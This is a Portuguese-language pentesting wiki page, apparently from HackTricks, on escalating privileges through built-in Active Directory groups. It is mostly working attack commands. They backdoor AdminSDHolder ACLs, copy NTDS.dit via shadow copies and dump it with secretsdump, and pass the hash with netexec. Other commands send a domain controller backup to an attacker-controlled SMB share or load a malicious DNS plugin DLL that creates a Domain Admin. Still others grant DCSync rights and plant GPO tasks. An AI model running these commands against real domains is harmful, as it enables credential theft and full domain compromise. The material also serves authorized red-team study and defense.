# Grupos privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos conhecidos com privilégios de administração

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo tem permissão para criar contas e grupos que não são administradores no domínio. Além disso, ele permite o login local no Domain Controller (DC).

Para identificar os membros deste grupo, o seguinte comando é executado:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
É permitido adicionar novos usuários, assim como fazer login local no DC.<sup>[[1]](#references)</sup>

## Grupo AdminSDHolder

A Access Control List (ACL) do grupo **AdminSDHolder** é crucial, pois define as permissões para todos os "grupos protegidos" no Active Directory, incluindo grupos com altos privilégios. Esse mecanismo garante a segurança desses grupos ao impedir modificações não autorizadas.

Um atacante poderia explorar isso modificando a ACL do grupo **AdminSDHolder**, concedendo permissões totais a um usuário padrão. Isso efetivamente daria a esse usuário controle total sobre todos os grupos protegidos. Se as permissões desse usuário fossem alteradas ou removidas, elas seriam reinstauradas automaticamente em até uma hora devido ao funcionamento do sistema.<sup>[[14]](#references)</sup>

A documentação recente do Windows Server ainda trata vários grupos de operadores integrados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). O processo **SDProp** é executado no **PDC Emulator** a cada 60 minutos por padrão, define `adminCount=1` e desativa a herança em objetos protegidos. Isso é útil tanto para persistência quanto para identificar usuários privilegiados obsoletos que foram removidos de um grupo protegido, mas ainda mantêm a ACL sem herança.<sup>[[12]](#references)</sup>

Os comandos para revisar os membros e modificar as permissões incluem:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Um script está disponível para agilizar o processo de restauração: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para obter mais detalhes, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## Lixeira do AD

A associação a este grupo permite a leitura de objetos excluídos do Active Directory, o que pode revelar informações confidenciais:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Isso é útil para **recuperar caminhos de privilégios anteriores**. Objetos excluídos ainda podem expor `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs antigos ou o DN de um grupo privilegiado excluído que posteriormente pode ser restaurado por outro operador.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Acesso ao Domain Controller

O acesso aos arquivos no DC é restrito, a menos que o usuário faça parte do grupo `Server Operators`, o que altera o nível de acesso.

### Privilege Escalation

Usando `PsService` ou `sc` do Sysinternals, é possível inspecionar e modificar as permissões dos serviços. O grupo `Server Operators`, por exemplo, tem controle total sobre determinados serviços, permitindo a execução de comandos arbitrários e privilege escalation:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` têm acesso total, permitindo a manipulação de serviços para obter privilégios elevados.

## Backup Operators

A associação ao grupo `Backup Operators` fornece acesso ao sistema de arquivos do `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem percorrer pastas, listar e copiar arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para esse processo.<sup>[[1]](#references)</sup>

Para listar os membros do grupo, execute:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque Local

Para explorar esses privilégios localmente, as seguintes etapas são empregadas:

1. Importar as bibliotecas necessárias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilite e verifique `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acessar e copiar arquivos de diretórios restritos, por exemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque AD

O acesso direto ao sistema de arquivos do Domain Controller permite o roubo do banco de dados `NTDS.dit`, que contém todos os hashes NTLM de usuários e computadores do domínio.

#### Usando diskshadow.exe

1. Crie uma cópia de sombra da unidade `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copie o `NTDS.dit` da shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, use `robocopy` para copiar arquivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraia `SYSTEM` e `SAM` para obtenção de hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recupere todos os hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Pós-extração: Pass-the-Hash para DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Usando wbadmin.exe

1. Configure o filesystem NTFS para o servidor SMB na máquina do atacante e armazene as credenciais SMB em cache na máquina-alvo.
2. Use `wbadmin.exe` para realizar o backup do sistema e extrair o `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para uma demonstração prática, veja [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Membros do grupo **DnsAdmins** podem explorar seus privilégios para carregar uma DLL arbitrária com privilégios de SYSTEM em um servidor DNS, frequentemente hospedado em Domain Controllers. Esse recurso permite um potencial significativo de exploração.

Para listar os membros do grupo DnsAdmins, use:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Executar DLL arbitrária (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidade permite a execução de código arbitrário com privilégios de SYSTEM no serviço DNS (geralmente dentro dos DCs). Esse problema foi corrigido em 2021.

Os membros podem fazer com que o servidor DNS carregue uma DLL arbitrária (localmente ou de um compartilhamento remoto) usando comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar o serviço DNS (o que pode exigir permissões adicionais) é necessário para que a DLL seja carregada:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para obter mais detalhes sobre esse vetor de ataque, consulte ired.team.

#### Mimilib.dll

Também é possível usar mimilib.dll para execução de comandos, modificando-o para executar comandos específicos ou reverse shells. [Confira esta publicação](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para obter mais informações.<sup>[[15]](#references)</sup>

### Registro WPAD para MitM

DnsAdmins podem manipular registros DNS para realizar ataques Man-in-the-Middle (MitM), criando um registro WPAD após desabilitar a lista de bloqueio de consultas global. Ferramentas como Responder ou Inveigh podem ser usadas para spoofing e captura de tráfego de rede.

### Event Log Readers
Os membros podem acessar logs de eventos, encontrando potencialmente informações confidenciais, como senhas em texto simples ou detalhes de execução de comandos:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Este grupo pode modificar DACLs no objeto do domínio, potencialmente concedendo privilégios DCSync. As técnicas de privilege escalation que exploram este grupo estão detalhadas no repositório GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Se você puder atuar como membro deste grupo, o abuso clássico é conceder a uma entidade controlada pelo atacante os direitos de replicação necessários para [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historicamente, o **PrivExchange** encadeava acesso a caixas de correio, autenticação coercitiva do Exchange e LDAP relay para obter esse mesmo primitive. Mesmo quando esse caminho de relay é mitigado, a associação direta ao grupo `Exchange Windows Permissions` ou o controle de um servidor Exchange continua sendo uma rota de alto valor para obter direitos de replicação do domínio.

## Hyper-V Administrators

Os Hyper-V Administrators têm acesso total ao Hyper-V, que pode ser explorado para obter controle sobre Domain Controllers virtualizados. Isso inclui clonar DCs em execução e extrair hashes NTLM do arquivo NTDS.dit.

### Exemplo de exploração

O abuso prático geralmente envolve **acesso offline aos discos/checkpoints dos DCs**, em vez de técnicas antigas de LPE no nível do host. Com acesso ao host Hyper-V, um operador pode criar um checkpoint ou exportar um Domain Controller virtualizado, montar o VHDX e extrair `NTDS.dit`, `SYSTEM` e outros secrets sem interagir com o LSASS dentro do guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
A partir daí, reutilize o workflow de `Backup Operators` para copiar `Windows\NTDS\ntds.dit` e os registry hives offline. Workflow relacionado a arquivos de backup:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

Este grupo permite que os membros criem Group Policies no domínio. No entanto, seus membros não podem aplicar group policies a usuários ou grupos, nem editar GPOs existentes.

A nuance importante é que o **criador se torna o proprietário da nova GPO** e normalmente obtém direitos suficientes para editá-la posteriormente. Isso significa que este grupo é interessante quando você pode:

- criar uma GPO maliciosa e convencer um administrador a vinculá-la a uma OU/domínio alvo
- editar uma GPO criada por você que já esteja vinculada em algum local útil
- abusar de outro direito delegado que permita vincular GPOs, enquanto este grupo fornece a capacidade de edição

O abuso prático normalmente consiste em adicionar uma **Immediate Task**, um **startup script**, uma alteração de **local admin membership** ou de **user rights assignment** por meio de arquivos de policy armazenados no SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Se editar a GPO manualmente através do `SYSVOL`, lembre-se de que a alteração, por si só, não é suficiente: `versionNumber`, `GPT.ini` e, às vezes, `gPCMachineExtensionNames` também devem ser atualizados, caso contrário os clientes ignorarão a atualização da policy.<sup>[[9]](#references)</sup>

## Gerenciamento da Organização

Em ambientes onde o **Microsoft Exchange** está implantado, um grupo especial conhecido como **Organization Management** possui capacidades significativas. Esse grupo tem privilégios para **acessar as mailboxes de todos os usuários do domínio** e mantém **controle total sobre a** Organizational Unit (OU) **'Microsoft Exchange Security Groups'**. Esse controle inclui o grupo **`Exchange Windows Permissions`**, que pode ser explorado para privilege escalation.

### Exploração de Privilégios e Comandos

#### Print Operators

Os membros do grupo **Print Operators** recebem vários privilégios, incluindo o **`SeLoadDriverPrivilege`**, que permite **fazer logon localmente em um Domain Controller**, desligá-lo e gerenciar impressoras. Para explorar esses privilégios, especialmente quando o **`SeLoadDriverPrivilege`** não está visível em um contexto não elevado, é necessário realizar o bypass do User Account Control (UAC).<sup>[[1]](#references)</sup>

Para listar os membros desse grupo, usa-se o seguinte comando do PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Em Controladores de Domínio, este grupo é perigoso porque a política padrão de Controladores de Domínio concede o **`SeLoadDriverPrivilege`** a `Print Operators`. Se você obtiver um token elevado de um membro desse grupo, poderá habilitar o privilégio e carregar um driver assinado, mas vulnerável, para chegar ao kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Para obter detalhes sobre o gerenciamento de tokens, consulte [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Os membros deste grupo recebem acesso a PCs por meio do Remote Desktop Protocol (RDP). Para enumerar esses membros, há comandos do PowerShell disponíveis:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Mais informações sobre a exploração de RDP podem ser encontradas em recursos dedicados de pentesting.

#### Usuários de Gerenciamento Remoto

Os membros podem acessar PCs por meio do **Windows Remote Management (WinRM)**. A enumeração desses membros é realizada por meio de:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de exploração relacionadas ao **WinRM**, consulte a documentação específica.

#### Server Operators

Este grupo tem permissões para realizar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alteração da hora do sistema e desligamento do sistema.<sup>[[1]](#references)</sup> Para enumerar os membros, o comando fornecido é:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Em Controladores de Domínio, `Server Operators` normalmente herdam direitos suficientes para **reconfigurar ou iniciar/parar serviços** e também recebem `SeBackupPrivilege`/`SeRestorePrivilege` por meio da política padrão de DC. Na prática, isso os torna uma ponte entre o **abuso do controle de serviços** e a **extração do NTDS**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Se uma ACL de serviço conceder a este grupo direitos de alteração/inicialização, aponte o serviço para um comando arbitrário, inicie-o como `LocalSystem` e restaure o `binPath` original. Se o controle de serviços estiver restrito, recorra às técnicas de `Backup Operators` acima para copiar `NTDS.dit`.

## References

- [1] [ired.team – Contas privilegiadas e privilégios de token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusando de SeLoadDriverPrivilege para escalada de privilégios](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusando de permissões de GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Abuso de GPO, Parte 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Guia de um Red Teamer para GPOs e OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Função ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP anônimo → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Apêndice C: Contas e grupos protegidos no Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Como abusar e criar um backdoor no AdminSDHolder para obter persistência de Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusando do privilégio DnsAdmins para escalada no Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informações sobre abuso da aresta GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Função NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
